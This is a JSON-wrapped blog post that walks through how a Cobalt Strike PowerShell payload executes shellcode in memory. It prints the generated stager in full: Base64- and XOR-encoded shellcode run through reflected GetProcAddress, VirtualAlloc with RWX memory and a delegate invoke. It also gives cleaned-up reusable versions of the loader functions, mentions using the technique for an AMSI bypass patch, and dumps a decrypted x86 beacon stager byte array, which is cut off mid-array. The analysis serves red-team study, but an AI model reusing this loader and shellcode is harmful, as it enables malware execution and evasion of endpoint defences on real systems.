{
    "id": "440110c2-e7b1-480c-a8ea-492032ecd264",
    "created_at": "2023-01-12T15:07:13.889116Z",
    "updated_at": "2025-03-27T02:16:01.128315Z",
    "deleted_at": null,
    "sha1_hash": "3a7110302aff8249894e71dab406cb22ecb83342",
    "title": "2020-12-01 - Cobalt Strike PowerShell Execution",
    "authors": "",
    "file_creation_date": "2022-05-28T15:59:57Z",
    "file_modification_date": "2022-05-28T15:59:57Z",
    "file_size": 245606,
    "plain_text": "# Cobalt Strike PowerShell Execution\n\n**mez0.cc/posts/cobaltstrike-powershell-exec/**\n\n## Table of Contents\n\n Introduction\n\n### As I was looking around for ways to execute shellcode in PowerShell, I stumbled on a few ways to achieve it. Invoke-Shellcode being the most popular, as well as FuzzySec's Low- Level Windows API Access From PowerShell tutorial. These are both solid ways of doing it, but I did specifically want to stay away from using Add-Type and calling C# functionality.\n\n So, instead, I ended up just going through the Cobalt Strike implementation as I didn't really know how Cobalt did it. With that said, this blog is a run through of how Cobalt Strike manages to execute shellcode from PowerShell - A code review, I guess(?).\n\n## The sample code\n\n### To get a PowerShell payload; just go to Attacks, Payload Generator and select PowerShell and tick x64. Opening up the script:\n\n\n-----\n\n```\nSet StrictMde Version 2\n$DoIt = @'\nfunction func_get_proc_address {\n  Param ($var_module, $var_procedure)   \n  $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | WhereObject { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll')\n}).GetType('Microsoft.Win32.UnsafeNativeMethods')\n  $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]]\n@('System.Runtime.InteropServices.HandleRef', 'string'))\n  return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](NewObject System.Runtime.InteropServices.HandleRef((New-Object IntPtr),\n($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null,\n@($var_module)))), $var_procedure))\n}\nfunction func_get_delegate_type {\n  Param (\n    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n    [Parameter(Position = 1)] [Type] $var_return_type = [Void]\n  )\n  $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object\nSystem.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModu\n $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',\n[System.MulticastDelegate])\n  $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public',\n[System.Reflection.CallingConventions]::Standard,\n$var_parameters).SetImplementationFlags('Runtime, Managed')\n  $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',\n$var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n  return $var_type_builder.CreateType()\n}\n[Byte[]]$var_code =\n[System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n  $var_code[$x] = $var_code[$x] -bxor 35\n}\n$var_va =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc\n kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32],\n[UInt32]) ([IntPtr])))\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer,\n$var_code.length)\n$var_runme =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer,\n(func_get_delegate_type @([IntPtr]) ([Void])))\n\n```\n\n-----\n\n```\n$var_runme.Invoke([IntPtr]::Zero)\n'@\nIf ([IntPtr]::size -eq 8) {\n  start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job\n}\nelse {\n  IEX $DoIt\n}\n\n### There is a fair bit going on here and I want to get an understanding of how it is working. To begin with, I'll focus on the data between the here-string.\n\n Logically, the first thing to look at here is the functions.\n\n## func_get_proc_address\n\n### The first function is func_get_proc_address, it looks like this:\nfunction func_get_proc_address {\n  Param ($var_module, $var_procedure)   \n  $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | WhereObject { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll')\n}).GetType('Microsoft.Win32.UnsafeNativeMethods')\n  $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]]\n@('System.Runtime.InteropServices.HandleRef', 'string'))\n  return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](NewObject System.Runtime.InteropServices.HandleRef((New-Object IntPtr),\n($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null,\n@($var_module)))), $var_procedure))\n}\n\n This function takes in two parameters:\n\n 1. $var_module 2. $var_procedure\n\n Looking at how this function is used later on in the code, and by the name of the function, its probably going to get an address to the given method:\nfunc_get_proc_address kernel32.dll VirtualAlloc\n\n Pulling the function out, and calling it via the above, the following data is returned, confirming the address:\nPS C:\\Users\\testinguser\\Desktop> powershell -ep bypass -f .\\debug.ps1\n140707592851104\nPS C:\\Users\\testinguser\\Desktop>\n\n```\n\n-----\n\n### Going through the code line-by-line, the first line does a lot and can be broken down into something more human readable. It starts by getting all the assemblies in the current AppDomain:\n```\n[AppDomain]::CurrentDomain.GetAssemblies()\n\n This line is piped into Where-Object to pull out System.dll . Running this in PowerShell looks like this:\nPS C:\\Users\\testinguser\\Desktop> [AppDomain]::CurrentDomain.GetAssemblies() | WhereObject { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll')\n}\nGAC  Version    Location\n---  -------    -------True  v4.0.30319  \nC:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\Syste\nPS C:\\Users\\testinguser\\Desktop>\n\n The DLL has been obtained from the Global Assembly Cache.\n\n On that object, GetType is used to get access to UnsafeNativeMethods . This blog from Matt Graeber is a great explanation of this method, he explains the Unsafe Methods as:\n\n Microsoft.Win32.UnsafeNativeMethods is an internal class that cannot be referenced through any direct means. If you try to reference the class, you will get an error stating that its module is not loaded. Microsoft.Win32.UnsafeNativeMethods is implemented within System.dll in the GAC.\n\n So, at this point, access to the Microsoft.Win32.UnsafeNativeMethods class has been achieved.\n\n To recap, lets reformat the code to something easy to follow:\n$SystemDLL = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {\n$_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') })\n$UnsafeMethods = $SystemDLL.GetType('Microsoft.Win32.UnsafeNativeMethods')\n\n Now that access to the UnsafeNativeMethods has been sorted, GetMethod is used to access GetProcAddress :\n$UnsafeMethods.GetMethod('GetProcAddress', [Type[]]\n@('System.Runtime.InteropServices.HandleRef', 'string'))\n\n I believe that this call to GetMethod is using this overload, and passing in the types to be a HandleRef and a string. With that, access to GetProcAddress is achieved, and the code can now be updated to:\n\n```\n\n-----\n\n```\n$SystemDLL ([AppDomain]::CurrentDomain.GetAssemblies() | Where Object {\n$_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') })\n$UnsafeMethods = $SystemDLL.GetType('Microsoft.Win32.UnsafeNativeMethods')\n$procAddress = $UnsafeMethods.GetMethod('GetProcAddress', [Type[]]\n@('System.Runtime.InteropServices.HandleRef', 'string'))\n\n### calling $procAddress :\nName            : GetProcAddress\nDeclaringType       : Microsoft.Win32.UnsafeNativeMethods\nReflectedType       : Microsoft.Win32.UnsafeNativeMethods\nMemberType         : Method\nMetadataToken       : 100663864\nModule           : System.dll\nIsSecurityCritical     : True\nIsSecuritySafeCritical   : True\nIsSecurityTransparent   : False\nMethodHandle        : System.RuntimeMethodHandle\nAttributes         : PrivateScope, Public, Static, HideBySig, PinvokeImpl\nCallingConvention     : Standard\nReturnType         : System.IntPtr\nReturnTypeCustomAttributes : IntPtr\nReturnParameter      : IntPtr\nIsGenericMethod      : False\nIsGenericMethodDefinition : False\nContainsGenericParameters : False\nMethodImplementationFlags : PreserveSig\nIsPublic          : True\nIsPrivate         : False\nIsFamily          : False\nIsAssembly         : False\nIsFamilyAndAssembly    : False\nIsFamilyOrAssembly     : False\nIsStatic          : True\nIsFinal          : False\nIsVirtual         : False\nIsHideBySig        : True\nIsAbstract         : False\nIsSpecialName       : False\nIsConstructor       : False\nCustomAttributes      :\n{[System.Runtime.InteropServices.DllImportAttribute(\"kernel32.dll\", EntryPoint =\n\"GetProcAddress\", CharSet = 2, ExactSpelling = False, SetLastError = False,\nPreserveSig = True, CallingConvention = 1, BestFitMapping = False,\n               ThrowOnUnmappableChar = False)],\n[System.Runtime.InteropServices.PreserveSigAttribute()]}\n\n In a typical Cobalt Strike fashion, no variables are defined, the return contains a whole bunch of operations on one line:\nreturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object\nSystem.Runtime.InteropServices.HandleRef((New-Object IntPtr),\n($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null,\n@($var_module)))), $var_procedure))\n\n```\n\n-----\n\n### This looks overwhelming, but its actually not that difficult to understand. If we start from the\n```\nInvoke(), and break it down like this:\n$getModuleHandle = $UnsafeMethods.GetMethod('GetModuleHandle')\n$dllHandle = $getModuleHandle.Invoke($null, @($dllName))\n$params = @([System.Runtime.InteropServices.HandleRef](New-Object\nSystem.Runtime.InteropServices.HandleRef((New-Object IntPtr), $dllHandle)),\n$methodName)\nreturn $procAddress.Invoke($null, $params)\n\n#### $getModuleHandle is used to get access to the GetModuleHandle method. Then, using\n### that, a reference to the DLL in question is achieved and stored in $dllHandle .\n\n The $params variable sets [0] to be a HandleRef which will allow the resource to be passed to unmanaged code, and for it to be invoked. HandleRef also takes in the\n$dllHandle previously set. Then, in [1], the $methodName is passed in. This is the\n\n method to actually invoke. Here is a full tidied up example:\nfunction GetPtrToMethod(){\n  Param ($dllName, $methodName)\n  $SystemDLL = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {\n$_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') })\n  $UnsafeMethods = $SystemDLL.GetType('Microsoft.Win32.UnsafeNativeMethods')\n  $procAddress = $UnsafeMethods.GetMethod('GetProcAddress', [Type[]]\n@('System.Runtime.InteropServices.HandleRef', 'string'))\n  $getModuleHandle = $UnsafeMethods.GetMethod('GetModuleHandle')\n  $dllHandle = $getModuleHandle.Invoke($null, @($dllName))\n  $params = @([System.Runtime.InteropServices.HandleRef](New-Object\nSystem.Runtime.InteropServices.HandleRef((New-Object IntPtr), $dllHandle)),\n$methodName)\n  return $procAddress.Invoke($null, $params)\n}\nGetPtrToMethod \"Kernel32.dll\" \"VirtualAlloc\"\n\n Running this returns an address: 140707592851104 .\n\n So, summarising this function; its used to get access to the Unsafe Native APIs, and then using those to gain access to any method required (as long as the DLL and Method are passed in as strings).\n\n## func_get_delegate_type\n\n### The second function is: func_get_delegate_type .\n\n```\n\n-----\n\n```\nfunction CreateDynamicAssemblyType {\n  Param (\n    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $parameterTypes,\n    [Parameter(Position = 1)] [Type] $returnType = [Void]\n  )\n  $dynamicAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object\nSystem.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModu\n $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',\n[System.MulticastDelegate])\n  $dynamicAssembly.DefineConstructor('RTSpecialName, HideBySig, Public',\n[System.Reflection.CallingConventions]::Standard,\n$parameterTypes).SetImplementationFlags('Runtime, Managed')\n  $dynamicAssembly.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',\n$returnType, $parameterTypes).SetImplementationFlags('Runtime, Managed')\n  return $dynamicAssembly.CreateType()\n}\n\n### This function is called twice, and takes in the following parameters:\n\n 1. func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32])\n   ([IntPtr])\n\n 2. func_get_delegate_type @([IntPtr]) ([Void])\n\n The first parameter is the parameters types the method is expecting, and the second is the return type. As seen here:\nParam (\n  [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n  [Parameter(Position = 1)] [Type] $var_return_type = [Void]\n)\n\n Again, super long operations are being performed on the same lines, here is the first one:\n$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object\nSystem.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModu\n $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',\n[System.MulticastDelegate])\n\n It can be broken down to:\n[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object\nSystem.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run)\n\n The DefineDynamicAssembly takes in two parameters: Assembly Name and Assembly Builder Access. In this case, ReflectedDelegate is the name and Run is the access level. Its also worth knowing, the name can be anything. This can be stored like so:\n\n```\n\n-----\n\n```\n$dynamicAssembly [AppDomain]::CurrentDomain.DefineDynamicAssembly((New Object\nSystem.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run)\n\n### Once that is done, the modules are then defined:\n.DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class,\nPublic, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\n This is doing exactly as it sounds, Defining a module for the assembly, and then defining a type. Nothing needs to be changed here, except the variable name, so it looks like this:\n$dynamicAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object\nSystem.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModu\n $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',\n[System.MulticastDelegate])\n\n Moving onto the next line, constructors are created with the DefineConstructor method:\n$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public',\n[System.Reflection.CallingConventions]::Standard, $var_parameters)\n\n The first value passed into this call is a comma split list of attributes which are the methodAttributes.\n\n RTSpecialName: Indicates that the common language runtime checks the name encoding. HideBySig: Indicates that the method hides by name and signature; otherwise, by name only. Public: Indicates that the method is accessible to any object for which this object is in scope.\n\n The second parameter is the CallingConventions which in this case is set to Standard :\n\n Specifies the default calling convention as determined by the common language runtime. Use this calling convention for static methods. For instance or virtual methods use HasThis .\n\n The final value is the parameter types for the constructor. The specific values passed will come along shortly. With that done, the next thing is setting the implementation flags with SetImplementationFlags. The attributes passed are the MethodImplAttributes:\n\n Runtime: Specifies that the method implementation is provided by the runtime. Managed: Specifies that the method is implemented in managed code.\n\n There is one last thing to do before returning this function, and that's defining a method:\n\n```\n\n-----\n\n```\n$var_type_builder.DefineMethod( Invoke, Public, HideBySig, NewSlot, Virtual,\n$var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\n### This is using the DefineMethod call to do just that, define a method. Not much needs to be said here because it has all been explained in the previous step. The only difference is that a new overload is being used. It adds a new method to the type, with the specified name, method attributes, calling convention, method signature, and custom modifiers. This is where the two function parameters are passed in.\n$var_parameters is an array of types that the function is expecting, so in the case of\nLoadLibrary, it would look like this:\n$loadLibraryPtr = GetPtrToMethod \"Kernel32.dll\" \"LoadLibraryA\"\n$loadLibraryAssembly = CreateDynamicAssemblyType @(\"string\") ([IntPtr])\n$loadLibrary =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($loadLibraryPt\n $loadLibraryAssembly)\n\"string\" is the type that the function is expecting, and the second value is an IntPtr,\n\n which is the return type.\n\n During testing, I implemented the AmsiScanBuffer Patch using this methodology. Load in each WinAPI call using the above, and execute it with the .Invoke() method. The next section on execution will be a good example of how to do this.\n\n For this function, I didn't change anything, only the variable name:\n$dynamicAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object\nSystem.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModu\n $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',\n[System.MulticastDelegate])\n$dynamicAssembly.DefineConstructor('RTSpecialName, HideBySig, Public',\n[System.Reflection.CallingConventions]::Standard,\n$var_parameters).SetImplementationFlags('Runtime, Managed')\n$dynamicAssembly.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',\n$var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n$dynamicAssembly.CreateType()\n\n Running this creates a new type:\nIsPublic IsSerial Name                   BaseType\n-------- -------- ----                   -------True   True   MyDelegateType              System.MulticastDelegate\n\n The full function looks like this:\n\n```\n\n-----\n\n```\nfunction CreateDynamicAssemblyType {\n  Param (\n    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $parameterTypes,\n    [Parameter(Position = 1)] [Type] $returnType = [Void]\n  )\n  $dynamicAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object\nSystem.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModu\n $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',\n[System.MulticastDelegate])\n  $dynamicAssembly.DefineConstructor('RTSpecialName, HideBySig, Public',\n[System.Reflection.CallingConventions]::Standard,\n$parameterTypes).SetImplementationFlags('Runtime, Managed')\n  $dynamicAssembly.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',\n$returnType, $parameterTypes).SetImplementationFlags('Runtime, Managed')\n  return $dynamicAssembly.CreateType()\n}\n\n### The whole point of this is to create a new type for CreateDelegateFunctionPointer as its second parameter requires a type class. Doing it this way allows for a type to be created in a controller, and dynamic way.\n\n## The Execution\n\n### With both functions explained, the only bit is to look at the execution:\n[Byte[]]$var_code =\n[System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n  $var_code[$x] = $var_code[$x] -bxor 35\n}\n$var_va =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc\n kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32],\n[UInt32]) ([IntPtr])))\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer,\n$var_code.length)\n$var_runme =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer,\n(func_get_delegate_type @([IntPtr]) ([Void])))\n$var_runme.Invoke([IntPtr]::Zero)\n\n The first few steps are obvious, its just decoding some base64 and XORing the data to get the shellcode.\n\n I'll come back to the shellcode I used shortly. The first operation being used is:\n\n```\n\n-----\n\n```\n$var_va \n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc\n kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32],\n[UInt32]) ([IntPtr])))\n\n### There's a bunch going on here, but the main call here is the GetDelegateForFunctionPointer. As the name suggests, its getting a Delegate for a function pointer.\n\n A delegate is a type that represents references to methods with a particular parameter list and return type. When you instantiate a delegate, you can associate its instance with any method with a compatible signature and return type. You can invoke (or call) the method through the delegate instance.\n\n It allows for a method to be invoked through the delegate instance and\nGetDelegateForFunctionPointer can convert unmanaged function pointers into\n\n delegates.\n\n The first parameter passed to the delegate method is a call for VirtualAlloc, for my own sanity, I split that call out into a variable:\n$virtualAllocPtr = GetPtrToMethod \"kernel32.dll\" \"VirtualAlloc\"\n\n The second parameter is the dynamically created assembly, which can be split out to:\n$virtalAllocAssembly = CreateDynamicAssemblyType @([IntPtr], [UInt32], [UInt32],\n[UInt32]) ([IntPtr])\n\n To make this more readable for myself, it becomes:\n$virtualAlloc =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($virtualAllocP\n $virtalAllocAssembly)\n\n By doing this, a delegate for VirtualAlloc is achieved, and it can be called (invoked) on the next line. Cobalt Strike does it like so:\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n\n The above is straight-forward, it invokes the VirtualAlloc and pass in the usual suspects. As for the exact shellcode used by the payload generator, I just did used this code with the XOR and Base64:\n\n```\n\n-----\n\n```\n[Byte[]]$var_code \n[System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n  $var_code[$x] = $var_code[$x] -bxor 35\n}\n$s = \"\"\nforeach($i in $var_code){\n  $a = \"{0:x}\" -f $i\n  $s += \"0x\" + $a + \", \"\n}\nWrite-Host $s\n\n### This wrote out the decrypted shellcode. The shellcode used here is x86 and to sanity check it, I just generated x64, x86 and then decrypted the shellcode. Comparing these together revealed that the XOR'd payload is the same length as the x86 generation:\n\n```\n\n-----\n\n```\n// x86\nbyte[] buf = new byte[800] { 0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5,\n0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72,\n0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,\n0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10,\n0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x01, 0xd0,\n0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x01, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34,\n0x8b, 0x01, 0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38,\n0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, 0x8b, 0x58,\n0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04,\n0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff,\n0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x00,\n0x68, 0x77, 0x69, 0x6e, 0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x31,\n0xff, 0x57, 0x57, 0x57, 0x57, 0x57, 0x68, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9,\n0x84, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xc9, 0x51, 0x51, 0x6a, 0x03, 0x51, 0x51, 0x68,\n0xbb, 0x01, 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb,\n0x70, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53,\n0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50,\n0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff,\n0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xc3, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74,\n0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1,\n0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56,\n0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39,\n0xc7, 0x74, 0xb7, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00,\n0x00, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x2f, 0x4d, 0x76, 0x4c, 0x4d, 0x00, 0x6f, 0x83,\n0x94, 0xa2, 0xc4, 0xc3, 0xd0, 0xe5, 0xa9, 0xe9, 0x7d, 0x2f, 0x18, 0xe1, 0x0d, 0xfb,\n0x10, 0x99, 0xa7, 0xb4, 0x23, 0x4d, 0x0c, 0xd9, 0xc7, 0xfb, 0x69, 0x6d, 0x58, 0x8a,\n0x3a, 0x6f, 0xb5, 0x05, 0x07, 0x7d, 0xd3, 0x90, 0x7c, 0x86, 0xcb, 0x0c, 0x60, 0x46,\n0x04, 0x08, 0x6d, 0xc9, 0x77, 0x7b, 0x0c, 0x65, 0x3c, 0x84, 0x4f, 0x48, 0x85, 0xcd,\n0x2c, 0x63, 0x05, 0xba, 0x0b, 0xf0, 0x84, 0x21, 0x3e, 0xe9, 0x05, 0xe3, 0xed, 0xb6,\n0xa3, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20,\n0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63,\n0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49,\n0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73,\n0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34,\n0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b,\n0x20, 0x46, 0x75, 0x6e, 0x57, 0x65, 0x62, 0x50, 0x72, 0x6f, 0x64, 0x75, 0x63, 0x74,\n0x73, 0x29, 0x0d, 0x0a, 0x00, 0xb0, 0x50, 0x62, 0x72, 0xe3, 0x3b, 0xf0, 0x8e, 0x9d,\n0x9a, 0xa7, 0x17, 0x99, 0x56, 0xe5, 0x60, 0x5f, 0x43, 0x77, 0xcb, 0x3d, 0x8b, 0x20,\n0xdf, 0x32, 0xa6, 0xc2, 0x4b, 0xb1, 0x5b, 0x85, 0x66, 0xdc, 0x71, 0xe2, 0x16, 0x77,\n0x71, 0x65, 0x0b, 0x58, 0x3c, 0x82, 0x52, 0x4c, 0x0a, 0x38, 0x9e, 0xbc, 0x76, 0x75,\n0x39, 0x5c, 0x6e, 0x27, 0xd0, 0x70, 0x4b, 0x7d, 0x3d, 0xe6, 0xc3, 0x95, 0x71, 0x5b,\n0xbf, 0x68, 0x0e, 0x57, 0x64, 0xdb, 0x83, 0xf2, 0x8f, 0xba, 0xdf, 0xfa, 0x8a, 0xba,\n0xbe, 0x07, 0xbc, 0xea, 0x9a, 0x5a, 0x3d, 0x61, 0x94, 0x30, 0xb6, 0xfb, 0xfe, 0x8c,\n0x0d, 0x2d, 0x39, 0xc4, 0x5d, 0xca, 0x76, 0x4c, 0x2f, 0xf2, 0xb6, 0xaf, 0x2a, 0xc3,\n0x67, 0xac, 0xeb, 0xe9, 0xe0, 0x2a, 0x3b, 0x14, 0xcb, 0xbe, 0xa4, 0xe3, 0x4a, 0x18,\n0xe7, 0x25, 0x57, 0x6b, 0x4a, 0x8c, 0xef, 0x7e, 0x1e, 0x0d, 0x77, 0xa8, 0x66, 0x88,\n0xe6, 0xfb, 0x35, 0xaf, 0x6a, 0xe6, 0xe6, 0xc7, 0x24, 0xf1, 0x7f, 0x20, 0x01, 0xb0,\n0x4f, 0x30, 0x7a, 0xcd, 0x54, 0xc1, 0xab, 0x2c, 0x78, 0x6e, 0xd4, 0x43, 0x78, 0x61,\n0xb1, 0x8c, 0x5f, 0xcd, 0x0c, 0x0d, 0xbf, 0xd6, 0xc6, 0x5f, 0x5a, 0x75, 0x8a, 0x7f,\n0x80, 0x7b, 0xaf, 0xa4, 0x33, 0x97, 0xd5, 0x28, 0x5a, 0x52, 0x3e, 0x18, 0x00, 0x6b,\n0xdd, 0x5e, 0xa5, 0x7d, 0xbb, 0xd8, 0x82, 0xcb, 0x98, 0x7a, 0x57, 0x00, 0x68, 0xf0,\n0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00,\n0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00,\n0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 